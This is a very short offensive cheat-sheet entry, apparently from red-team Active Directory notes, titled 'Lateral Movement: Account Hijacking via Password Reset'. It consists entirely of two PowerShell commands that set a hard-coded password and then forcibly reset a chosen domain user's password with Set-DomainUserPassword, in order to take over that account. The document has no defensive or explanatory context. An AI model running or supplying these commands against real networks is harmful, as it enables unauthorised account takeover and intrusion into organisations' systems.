## Lateral Movement
Account Hijacking via Password Reset
```
$SecPass = ConvertTo-SecureString "P@ssword123!" -AsPlainText -Force
Set-DomainUserPassword -Identity USERNAME -AccountPassword $SecPass
```